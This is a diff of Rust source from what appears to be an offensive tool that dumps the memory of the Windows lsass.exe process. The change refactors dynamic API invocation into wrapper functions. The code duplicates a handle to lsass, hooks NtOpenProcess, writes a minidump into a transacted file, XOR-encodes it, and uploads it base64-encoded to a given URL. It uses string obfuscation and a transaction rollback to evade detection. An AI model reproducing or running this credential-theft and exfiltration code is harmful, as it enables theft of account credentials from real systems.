@@ -12,8 +12,8 @@ use rand::distributions::Alphanumeric;
 use core::panic;
 use std::io::Cursor;
 use std::{fs::{self, File}, io::{Read, Write}, mem::{size_of}, ptr};
-use bindings::Windows::Win32::{Foundation::{BOOL, HANDLE}, System::{Threading::GetCurrentProcess, WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES, PUBLIC_OBJECT_TYPE_INFORMATION}}};
-use data::{CreateFileMapping, CreateFileTransactedA, CreateTransaction, GetFileSize, MapViewOfFile, MiniDumpWriteDump, PAGE_READONLY, PVOID, QueryFullProcessImageNameW, RollbackTransaction, SYSTEM_HANDLE_INFORMATION, SYSTEM_HANDLE_TABLE_ENTRY_INFO, UnmapViewOfFile, PAGE_EXECUTE_READWRITE, SetHandleInformation};
+use bindings::Windows::Win32::{Foundation::{HANDLE}, System::{Threading::GetCurrentProcess, WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES, PUBLIC_OBJECT_TYPE_INFORMATION}}};
+use data::{PAGE_READONLY, PVOID, SYSTEM_HANDLE_INFORMATION, SYSTEM_HANDLE_TABLE_ENTRY_INFO, PAGE_EXECUTE_READWRITE};
 
 static mut STATIC_HANDLE: isize = 0;
 
@@ -169,38 +169,24 @@ pub fn dump(key: &str, url: &str) {
 
                     }
 
-                
                     // We have a process handle
                     if type_name.to_lowercase() == "process"
                     {
-                        let kernel32 = dinvoke::get_module_base_address(&lc!("kernel32.dll"));
-
                         let len = 200usize; // I dont really think it exists a process image name longer than 200 characters
                         let buffer = vec![0u8; len];
                         let buffer: *mut u16 = std::mem::transmute(buffer.as_ptr());
-                        let ret: Option<i32>; 
-                        let func: QueryFullProcessImageNameW;
                         let ret_len: *mut u32 = std::mem::transmute(&len);
-                        // We retrieve the full name of the executable image for the process owner of the duplicated handle
-                        dinvoke::dynamic_invoke!(
-                            kernel32,
-                            &lc!("QueryFullProcessImageNameW"),
-                            func,
-                            ret,
+                        let z = dinvoke::query_full_process_image_name(
                             *dup_handle,
                             0,
                             buffer,
                             ret_len
                         );
 
-                        match ret {
-                            Some(z) =>
-                                if z == 0 
-                                {
-                                    shtei = shtei.add(1);
-                                    continue;
-                                }
-                            None => {shtei = shtei.add(1); continue;},
+                        if z == 0 
+                        {
+                            shtei = shtei.add(1);
+                            continue;
                         }
 
                         let mut image_name: String = "".to_string();
@@ -218,15 +204,8 @@ pub fn dump(key: &str, url: &str) {
                         // We have a valid process handled
                         if image_name.contains(&lc!("lsass.exe"))
                         {                         
-                            let ktmv = dinvoke::load_library_a(&lc!("KtmW32.dll")).unwrap();
-                            let func: CreateTransaction;
-                            let ret: Option<HANDLE>;
                             let description = "\0\0".as_ptr() as *mut u16;
-                            dinvoke::dynamic_invoke!(
-                                ktmv,
-                                &lc!("CreateTransaction"),
-                                func,
-                                ret,
+                            let z = dinvoke::create_transaction(
                                 ptr::null_mut(),
                                 ptr::null_mut(),
                                 0,
@@ -236,24 +215,17 @@ pub fn dump(key: &str, url: &str) {
                                 description
                             );
 
-                            let transaction_handle: HANDLE;
-
-                            match ret {
-                                Some(z) =>
-                                    if z.0 == -1 
-                                    {
-                                        shtei = shtei.add(1);
-                                        continue;
-                                    }
-                                    else
-                                    {
-                                        transaction_handle = z;
-                                    }
-                                None => {shtei = shtei.add(1); continue;},
+                            let transaction_handle: HANDLE;                           
+                            if z.0 == -1 
+                            {
+                                shtei = shtei.add(1);
+                                continue;
                             }
-
-                            let func: CreateFileTransactedA;
-                            let ret: Option<HANDLE>;
+                            else
+                            {
+                                transaction_handle = z;
+                            }
+                            
                             let mini: *const u32 = std::mem::transmute(&0xffff);
                             let rand_string: String = thread_rng()
                             .sample_iter(&Alphanumeric)
@@ -263,11 +235,7 @@ pub fn dump(key: &str, url: &str) {
 
                             let file_name = format!(".\\{}{}", rand_string, ".log");
                             let file_name = file_name.as_ptr() as *mut u8;
-                            dinvoke::dynamic_invoke!(
-                                kernel32,
-                                &lc!("CreateFileTransactedW"),
-                                func,
-                                ret,
+                            let z = dinvoke::create_file_transacted(
                                 file_name,
                                 0x80000000 | 0x40000000,
                                 0x00000002,
@@ -281,21 +249,16 @@ pub fn dump(key: &str, url: &str) {
                             );
 
                             let transacted_file_handle: HANDLE;
-
-                            match ret {
-                                Some(z) =>
-                                    if z.0 == -1 
-                                    {
-                                        shtei = shtei.add(1);
-                                        continue;
-                                    }
-                                    else
-                                    {
-                                        transacted_file_handle = z;
-                                    }
-                                None => {shtei = shtei.add(1); continue;},
+                            if z.0 == -1 
+                            {
+                                shtei = shtei.add(1);
+                                continue;
                             }
-
+                            else
+                            {
+                                transacted_file_handle = z;
+                            }
+                        
                             STATIC_HANDLE = (*dup_handle).0;
 
                             if !hook()
@@ -304,15 +267,8 @@ pub fn dump(key: &str, url: &str) {
                                 return;
                             }
 
-                            let dbg = dinvoke::load_library_a(&lc!("Dbgcore.dll")).unwrap();
-                            let func: MiniDumpWriteDump;
-                            let ret: Option<i32>;
                             // We use the duplicated handle to dump the process memory
-                            dinvoke::dynamic_invoke!(
-                                dbg,
-                                &lc!("MiniDumpWriteDump"),
-                                func,
-                                ret,
+                            let x = dinvoke::mini_dump_write_dump(
                                 *dup_handle,
                                 0, // Process Id does not seem to be needed 
                                 transacted_file_handle,
@@ -321,177 +277,131 @@ pub fn dump(key: &str, url: &str) {
                                 ptr::null_mut(),
                                 ptr::null_mut()
                             );
+                            
+                            if x == 1 
+                            {
+                                println!("{}",&lc!("[!] Lsass dump created!"));
 
-                            match ret {
-                                Some(x) => 
-                                    if x == 1 
-                                    {
-                                        println!("{}",&lc!("[!] Lsass dump created!"));
-                                        
-                                        let func: GetFileSize;
-                                        let ret: Option<u32>;
-                                        dinvoke::dynamic_invoke!(
-                                            kernel32,
-                                            &lc!("GetFileSize"),
-                                            func,
-                                            ret,
-                                            transacted_file_handle,
-                                            ptr::null_mut()
-                                        );
+                                let dump_size = dinvoke::get_file_size(
+                                    transacted_file_handle,
+                                    ptr::null_mut()
+                                );
 
-                                        let dump_size = ret.unwrap();
-
-                                        let func: CreateFileMapping;
-                                        let ret: Option<HANDLE>;
-                                        dinvoke::dynamic_invoke!(
-                                            kernel32,
-                                            &lc!("CreateFileMappingW"),
-                                            func,
-                                            ret,
-                                            transacted_file_handle,
-                                            ptr::null(),
-                                            PAGE_READONLY,
-                                            0,
-                                            0,
-                                            ptr::null_mut()
-                                        );
+                                let z = dinvoke::create_file_mapping(
+                                    transacted_file_handle,
+                                    ptr::null(),
+                                    PAGE_READONLY,
+                                    0,
+                                    0,
+                                    ptr::null_mut()
+                                );
 
 
-                                        let map_handle: HANDLE;
+                                let map_handle: HANDLE;
+                                if z.0 == -1 
+                                {
+                                    shtei = shtei.add(1);
+                                    continue;
+                                }
+                                else
+                                {
+                                    map_handle = z;
+                                }
+                                  
+                                let ret = dinvoke::map_view_of_file(
+                                    map_handle,
+                                    4, // FILE_MAP_READ
+                                    0,
+                                    0,
+                                    0
+                                );
 
-                                        match ret {
-                                            Some(z) =>
-                                                if z.0 == -1 
-                                                {
-                                                    shtei = shtei.add(1);
-                                                    continue;
-                                                }
-                                                else
-                                                {
-                                                    map_handle = z;
-                                                }
-                                            None => {shtei = shtei.add(1); continue;},
-                                        }
+                                let mut view_ptr = ret as *mut u8;
 
-                                        let func: MapViewOfFile; 
-                                        let ret: Option<PVOID>;
-
-                                        dinvoke::dynamic_invoke!(
-                                            kernel32,
-                                            &lc!("MapViewOfFile"),
-                                            func,
-                                            ret,
-                                            map_handle,
-                                            4, // FILE_MAP_READ
-                                            0,
-                                            0,
-                                            0
-                                        );
-
-                                        let mut view_ptr = ret.unwrap() as *mut u8;
-
-                                        let mut key_ptr = key.as_ptr();
-                                        let mut xor_key: u8 = *key_ptr;
-                                        key_ptr = key_ptr.add(1);
-                                        while *key_ptr != '\0' as u8
-                                        {
-                                            xor_key = xor_key ^ *key_ptr;
-                                            key_ptr = key_ptr.add(1);
-                                        }
+                                let mut key_ptr = key.as_ptr();
+                                let mut xor_key: u8 = *key_ptr;
+                                key_ptr = key_ptr.add(1);
+                                while *key_ptr != '\0' as u8
+                                {
+                                    xor_key = xor_key ^ *key_ptr;
+                                    key_ptr = key_ptr.add(1);
+                                }
 
 
-                                        let mut view_xor: Vec<u8> = vec![];
-                                        for _i in 0..dump_size
-                                        {
-                                            view_xor.push(*view_ptr ^ xor_key);
-                                            view_ptr = view_ptr.add(1);
-                                        }
+                                let mut view_xor: Vec<u8> = vec![];
+                                for _i in 0..dump_size
+                                {
+                                    view_xor.push(*view_ptr ^ xor_key);
+                                    view_ptr = view_ptr.add(1);
+                                }
 
-                                        let rand_string: String = thread_rng()
-                                        .sample_iter(&Alphanumeric)
-                                        .take(7)
-                                        .map(char::from)
-                                        .collect();
+                                let rand_string: String = thread_rng()
+                                .sample_iter(&Alphanumeric)
+                                .take(7)
+                                .map(char::from)
+                                .collect();
 
-                                        if url == ""
-                                        {
+                                if url == ""
+                                {
 
-                                            let file_name = format!("{}{}", rand_string, ".txt");
-                                            let mut file = std::fs::File::create(&file_name).unwrap();
-                                            let _r = file.write(&view_xor).unwrap();
+                                    let file_name = format!("{}{}", rand_string, ".txt");
+                                    let mut file = std::fs::File::create(&file_name).unwrap();
+                                    let _r = file.write(&view_xor).unwrap();
 
-                                            println!("{} {}.", &lc!("[+] Memory dump written to file"), file_name.as_str());
+                                    println!("{} {}.", &lc!("[+] Memory dump written to file"), file_name.as_str());
 
-                                        }
-                                        else
-                                        {
-                                            let rand_boundary: String = thread_rng()
-                                            .sample_iter(&Alphanumeric)
-                                            .take(16)
-                                            .map(char::from)
-                                            .collect();
+                                }
+                                else
+                                {
+                                    let rand_boundary: String = thread_rng()
+                                    .sample_iter(&Alphanumeric)
+                                    .take(16)
+                                    .map(char::from)
+                                    .collect();
 
-                                            let boundary: &str = &format!("{},{}", "------------------------", rand_boundary);
-                                            let mut data = Vec::new();
-                                            let _ = write!(data, "--{}\r\n", boundary);
-                                            let _ = write!(data, "Content-Disposition: form-data; name=\"file\"; filename=\"{}\"\r\n", rand_string);
-                                            let _ = write!(data, "Content-Type: text/plain\r\n");
-                                            let _ = write!(data, "\r\n");
-    
-                                            let _ = write!(data, "{}", base64::encode(&view_xor));
-                                            let _ = write!(data, "\r\n"); // The key thing you are missing
-                                            let _ = write!(data, "--{}--\r\n", boundary);
-    
-                                            let read = Cursor::new(&data);
-                                            let cont_type = format!("multipart/form-data; boundary={}", boundary);
-                                            //let client = reqwest::Client::new(); 
-                                            let _ = ureq::post(url)
-                                                .set("content-type",cont_type.as_str()) 
-                                                .set("Content-Length", data.len().to_string().as_str())
-                                                //.body(data) 
-                                                .send(read);
+                                    let boundary: &str = &format!("{},{}", "------------------------", rand_boundary);
+                                    let mut data = Vec::new();
+                                    let _ = write!(data, "--{}\r\n", boundary);
+                                    let _ = write!(data, "Content-Disposition: form-data; name=\"file\"; filename=\"{}\"\r\n", rand_string);
+                                    let _ = write!(data, "Content-Type: text/plain\r\n");
+                                    let _ = write!(data, "\r\n");
 
-                                            println!("{}", &lc!("[+] File uploaded."));
-                                        }
+                                    let _ = write!(data, "{}", base64::encode(&view_xor));
+                                    let _ = write!(data, "\r\n"); // The key thing you are missing
+                                    let _ = write!(data, "--{}--\r\n", boundary);
 
-                                        let func: UnmapViewOfFile;
-                                        let ret2: Option<BOOL>;
-                                        dinvoke::dynamic_invoke!(
-                                            kernel32,
-                                            &lc!("UnmapViewOfFile"),
-                                            func,
-                                            ret2,
-                                            ret.unwrap()
-                                        );
+                                    let read = Cursor::new(&data);
+                                    let cont_type = format!("multipart/form-data; boundary={}", boundary);
+                                    //let client = reqwest::Client::new(); 
+                                    let _ = ureq::post(url)
+                                        .set("content-type",cont_type.as_str()) 
+                                        .set("Content-Length", data.len().to_string().as_str())
+                                        //.body(data) 
+                                        .send(read);
 
-                                        if ret2.unwrap().as_bool() == true
-                                        {
-                                            println!("{}", &lc!("[+] Successfully unmapped view of file."));
-                                        }
+                                    println!("{}", &lc!("[+] File uploaded."));
+                                }
+
+                                let unmap = dinvoke::unmap_view_of_file(ret);
+
+                                if unmap
+                                {
+                                    println!("{}", &lc!("[+] Successfully unmapped view of file."));
+                                }
 
 
-                                        let func: RollbackTransaction;
-                                        let ret: Option<BOOL>;
-                                        dinvoke::dynamic_invoke!(
-                                            ktmv,
-                                            &lc!("RollbackTransaction"),
-                                            func,
-                                            ret,
-                                            transaction_handle
-                                        );
+                                let ret = dinvoke::rollback_transaction(transaction_handle);
 
-                                        if ret.unwrap().as_bool() == true 
-                                        {
-                                            println!("{}",&lc!("[+] Transaction successfully rollbacked."));
-                                        }
+                                if ret
+                                {
+                                    println!("{}",&lc!("[+] Transaction successfully rollbacked."));
+                                }
 
-                                        let _r = dinvoke::close_handle(transacted_file_handle).unwrap();
-                                        let _r = dinvoke::close_handle(map_handle).unwrap();
-                                        let _r = dinvoke::close_handle(transaction_handle).unwrap();
+                                let _r = dinvoke::close_handle(transacted_file_handle).unwrap();
+                                let _r = dinvoke::close_handle(map_handle).unwrap();
+                                let _r = dinvoke::close_handle(transaction_handle).unwrap();
 
-                                        break;
-                                    },
-                                None => {},
+                                break;
                             }
                             
 
@@ -587,15 +497,7 @@ pub fn nt_open_process_detour (mut _process_handle: *mut HANDLE, _access: u32, _
     unsafe 
     {
         let dup_handle = HANDLE{0: STATIC_HANDLE};
-
-        let func:SetHandleInformation;
-        let _ret: Option<BOOL>;
-        let k32 = dinvoke::get_module_base_address(&lc!("kernel32.dll"));
-        dinvoke::dynamic_invoke!(
-            k32,
-            &lc!("SetHandleInformation"),
-            func,
-            _ret,
+        let _  = dinvoke::set_handle_information(
             dup_handle,
             0x00000002, // HANDLE_FLAG_PROTECT_FROM_CLOSE
             0x00000002
